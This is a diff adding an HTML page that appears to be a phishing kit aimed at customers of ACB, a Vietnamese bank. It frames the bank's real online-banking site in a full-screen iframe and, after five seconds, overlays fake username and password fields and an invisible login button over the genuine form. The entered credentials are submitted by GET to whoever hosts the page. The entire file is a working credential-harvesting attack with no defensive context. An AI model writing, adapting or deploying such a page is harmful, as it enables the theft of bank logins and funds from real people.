@@ -1,0 +1,62 @@
+<html>
+  <head>
+    <title>ACB Online</title>
+    <style>
+      body {
+        position: relative;
+        margin: 0;
+      }
+      iframe {
+        border: none;
+        position: absolute;
+        width: 100%;
+        height: 100%;
+      }
+      #loginForm {
+        top: 275px;
+        height: 35px;
+        left: 606px;
+        width: 110px;
+        display: none;
+      }
+      #loginForm input {
+        position: absolute;
+        height: 25px;
+        width: 245px;
+        padding: 4px 6px;
+        color: #777;
+      }
+      #username {
+        top: 174px;
+        left: 815px;
+      }
+      #password {
+        top: 205px;
+        left: 606px;
+      }
+      #btn-login {
+        position: absolute;
+        top: 275px;
+        width: 110px;
+        left: 606px;
+        opacity: 0;
+        height: 32px;
+        cursor: pointer;
+      }
+    </style>
+  </head>
+  <body>
+    <iframe id="fr"src="https://online.acb.com.vn/acbib"></iframe>
+    <form id="loginForm" action="" method="GET">
+      <input id="username" type="text" name="username" placeholder="Tên truy cập">
+      <input id="password" type="password" name="password" placeholder="Mật khẩu">
+      <button id="btn-login" type="submit">Login</button>
+      <script>
+        const loginForm = document.getElementById('loginForm');
+        setTimeout(() => {
+          loginForm.style.display = 'block';
+        }, 5000);
+      </script>
+    </form>
+  </body>
+</html>
